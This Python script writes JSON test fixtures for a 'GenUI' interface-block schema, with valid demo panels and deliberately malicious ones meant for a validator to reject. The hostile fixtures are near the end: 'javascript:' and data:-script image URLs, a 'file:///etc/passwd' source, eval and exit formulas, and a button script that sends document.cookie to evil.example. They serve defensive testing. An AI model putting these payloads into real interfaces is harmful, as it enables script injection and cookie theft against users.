"""Genera le fixture GenUI v1 (JSON sempre valido: json.dump)."""
import json
from pathlib import Path

OUT = Path("tests/genui")
OUT.mkdir(parents=True, exist_ok=True)

ENV = {"visual_blocks_version": 1}


def wave_points():
    return [{"x": t / 2.0, "y_formula": "amp * sin(freq * x) * exp(0 - damping * x)"}
            for t in range(21)]


def genui_block(**kw):
    doc = {"type": "genui", "genui_version": 1}
    doc.update(kw)
    return doc


def write(name, blocks):
    doc = dict(ENV)
    doc["visual_blocks"] = blocks
    (OUT / name).write_text(json.dumps(doc, ensure_ascii=False), encoding="utf-8")
    print("wrote", name)


write("valid_parametric.json", [genui_block(
    id="damped-oscillator", title="Oscillatore smorzato",
    fallback_text="Simulazione interattiva: regola ampiezza, frequenza e smorzamento con gli slider e osserva la curva.",
    state={"amp": 1.0, "freq": 1.0, "damping": 0.15},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "text", "id": "intro", "text": "Muovi gli slider: la curva si aggiorna da sola."},
        {"kind": "slider", "id": "s-amp", "label": "Ampiezza", "bind": "amp", "min": 0.1, "max": 2.0, "step": 0.1},
        {"kind": "slider", "id": "s-freq", "label": "Frequenza", "bind": "freq", "min": 0.2, "max": 3.0, "step": 0.1},
        {"kind": "slider", "id": "s-damp", "label": "Smorzamento", "bind": "damping", "min": 0.0, "max": 1.0, "step": 0.05},
        {"kind": "metric", "id": "m-period", "label": "Periodo", "unit": "s", "formula": "1 / freq"},
        {"kind": "chart", "id": "c-wave", "chart_type": "line", "x_label": "t", "y_label": "x(t)",
         "series": [{"name": "x(t)", "points": wave_points()}]},
    ]})])

write("valid_algo.json", [genui_block(
    id="binsearch-demo", title="Ricerca binaria",
    fallback_text="Tutorial interattivo: array [2,5,8,11,14,19,23,30], target 11 trovato in 3 passi. Avanza con i pulsanti.",
    state={"step": 0},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "text", "id": "t0", "text": "Array: [2, 5, 8, 11, 14, 19, 23, 30] — target: 11. Passo {{step + 1}} di 4."},
        {"kind": "steps", "id": "st", "bind": "step", "items": [
            {"title": "Passo 1", "text": "lo=0, hi=7, mid=3 → a[3]=11. Confronta 11 == 11: trovato."},
            {"title": "Passo 2", "text": "Variante con target 19: 11 < 19, scarta la metà sinistra: lo=4."},
            {"title": "Passo 3", "text": "lo=4, hi=7, mid=5 → a[5]=19. Trovato."},
            {"title": "Complessità", "text": "Ogni passo dimezza lo spazio: O(log n)."},
        ]},
        {"kind": "row", "id": "nav", "children": [
            {"kind": "button", "id": "b-prev", "label": "Indietro",
             "action": {"kind": "local", "op": "step", "key": "step", "delta": -1}},
            {"kind": "button", "id": "b-next", "label": "Avanti",
             "action": {"kind": "local", "op": "step", "key": "step", "delta": 1}},
        ]},
        {"kind": "progress", "id": "p0", "formula": "(step + 1) / 4"},
        {"kind": "button", "id": "b-ask", "label": "Spiegami questo passo",
         "action": {"kind": "agent", "action_id": "explain_step", "state_keys": ["step"]}},
    ]})])

write("valid_dashboard.json", [genui_block(
    id="hw-compare", title="Confronto GPU",
    fallback_text="Confronto RTX 5060 Ti vs 5070 Ti: circa 2x su banda e core. Seleziona la metrica dal menu.",
    state={"metric": "prefill"},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "grid", "id": "g0", "columns": 2, "children": [
            {"kind": "metric", "id": "m1", "label": "5060 Ti prefill", "value": 654, "unit": " tok/s"},
            {"kind": "metric", "id": "m2", "label": "5070 Ti prefill", "value": 1250, "unit": " tok/s"},
            {"kind": "metric", "id": "m3", "label": "Rapporto banda", "value": 2.0, "unit": "x"},
            {"kind": "metric", "id": "m4", "label": "Rapporto core", "value": 1.94, "unit": "x"},
        ]},
        {"kind": "select", "id": "sel0", "label": "Metrica grafico", "bind": "metric",
         "options": ["prefill", "banda", "prezzo"]},
        {"kind": "chart", "id": "c-a", "chart_type": "bar",
         "visible_if": {"key": "metric", "op": "eq", "value": "prefill"},
         "series": [{"name": "tok/s", "points": [{"x": "5060Ti", "y": 654}, {"x": "5070Ti", "y": 1250}]}]},
        {"kind": "chart", "id": "c-b", "chart_type": "bar",
         "visible_if": {"key": "metric", "op": "eq", "value": "banda"},
         "series": [{"name": "GB/s", "points": [{"x": "5060Ti", "y": 448}, {"x": "5070Ti", "y": 896}]}]},
        {"kind": "chart", "id": "c-c", "chart_type": "bar",
         "visible_if": {"key": "metric", "op": "eq", "value": "prezzo"},
         "series": [{"name": "euro", "points": [{"x": "5060Ti", "y": 450}, {"x": "5070Ti", "y": 900}]}]},
        {"kind": "table", "id": "t0", "filter": True,
         "columns": [{"key": "k", "label": "Voce"}, {"key": "a", "label": "5060 Ti"}, {"key": "b", "label": "5070 Ti"}],
         "rows": [{"k": "Core CUDA", "a": "4608", "b": "8960"}, {"k": "Banda", "a": "448 GB/s", "b": "896 GB/s"},
                  {"k": "VRAM", "a": "16 GB", "b": "16 GB"}, {"k": "TDP", "a": "180 W", "b": "300 W"}]},
    ]})])

write("valid_tutorial.json", [genui_block(
    id="deploy-check", title="Checklist deploy",
    fallback_text="Checklist deploy in 3 passi: gateway, bridge, skill. Lo stato avanza spuntando le caselle.",
    state={"c1": False, "c2": False, "c3": False},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "alert", "id": "a0", "variant": "info", "text": "Spunta le caselle: il progresso segue da solo."},
        {"kind": "text", "id": "t0", "text": "Completati {{c1 + c2 + c3}} di 3."},
        {"kind": "checkbox", "id": "k1", "label": "Gateway 0.6.296 live", "bind": "c1"},
        {"kind": "checkbox", "id": "k2", "label": "Bridge laya riavviato", "bind": "c2"},
        {"kind": "checkbox", "id": "k3", "label": "Skill aggiornate", "bind": "c3"},
        {"kind": "progress", "id": "p0", "formula": "(c1 + c2 + c3) / 3"},
        {"kind": "button", "id": "b0", "label": "Ricomincia", "action": {"kind": "local", "op": "reset"}},
    ]})])

write("valid_agent_update.json", [
    genui_block(
        id="ui-demo-5", title="Render clip",
        fallback_text="Pannello: scegli nome e preset, poi premi Genera per inviare il job all'agente.",
        state={"name": "clip2", "preset": "journey_video_preview"},
        spec={"kind": "column", "id": "root", "children": [
            {"kind": "input", "id": "i-name", "label": "Nome clip", "bind": "name"},
            {"kind": "select", "id": "i-preset", "label": "Preset", "bind": "preset",
             "options": ["journey_video_preview", "journey_video_reframe916"]},
            {"kind": "button", "id": "b-go", "label": "Genera",
             "action": {"kind": "agent", "action_id": "render", "state_keys": ["name", "preset"],
                        "payload": {"source": "genui-demo"}}},
        ]}),
    genui_block(
        id="ui-demo-5", title="Render clip (aggiornata)",
        fallback_text="Pannello aggiornato con stato avanzamento.",
        state={"name": "clip2", "preset": "journey_video_preview"},
        spec={"kind": "column", "id": "root", "children": [
            {"kind": "text", "id": "t-done", "text": "Job inviato per clip2."},
            {"kind": "progress", "id": "p-job", "value": 0.4, "status": "rendering"},
        ]}),
])

write("compat_plain.json", [])

(OUT / "compat_plain.json").write_text(
    json.dumps({"no_visual_blocks_here": True, "output_text": "Risposta normale senza blocchi."},
               ensure_ascii=False), encoding="utf-8")

write("invalid_missing_id.json", [genui_block(
    title="Senza id", fallback_text="x", state={},
    spec={"kind": "text", "id": "a", "text": "ciao"})])

bad_kind = genui_block(id="bad-kind", fallback_text="x", state={},
                       spec={"kind": "megalodonte", "id": "a"})
write("invalid_bad_kind.json", [bad_kind])

write("invalid_bad_formula.json", [genui_block(
    id="bad-formula", fallback_text="x", state={"a": 1},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "metric", "id": "m", "label": "M", "formula": "a + * 2"},
        {"kind": "metric", "id": "m2", "label": "N", "formula": "System.exit(1)"},
        {"kind": "metric", "id": "m3", "label": "O", "formula": "eval(malevolo)"},
    ]})])

write("invalid_bad_action.json", [genui_block(
    id="evil-action", fallback_text="x", state={},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "button", "id": "b", "label": "Vai", "action": {"kind": "agent"}},
        {"kind": "button", "id": "b2", "label": "Vai2", "action": {"kind": "teleport", "action_id": "x"}},
    ]})])

write("evil_bad_url.json", [genui_block(
    id="evil-url", fallback_text="x", state={},
    spec={"kind": "column", "id": "root", "children": [
        {"kind": "image", "id": "i1", "src": "javascript:alert(1)"},
        {"kind": "image", "id": "i2", "src": "file:///etc/passwd"},
        {"kind": "image", "id": "i3", "src": "data:text/html,<script>alert(1)</script>"},
    ]})])

write("evil_handlers.json", [genui_block(
    id="evil-click", fallback_text="x", state={},
    spec={"kind": "column", "id": "root", "onClick": "steal()", "children": [
        {"kind": "button", "id": "b", "label": "Premi",
         "script": "fetch('https://evil.example/x?c='+document.cookie)"},
    ]})])

write("invalid_bad_variant.json", [genui_block(
    id="bad-variant", fallback_text="x", state={},
    spec={"kind": "alert", "id": "a", "variant": "hyper", "text": "x"})])
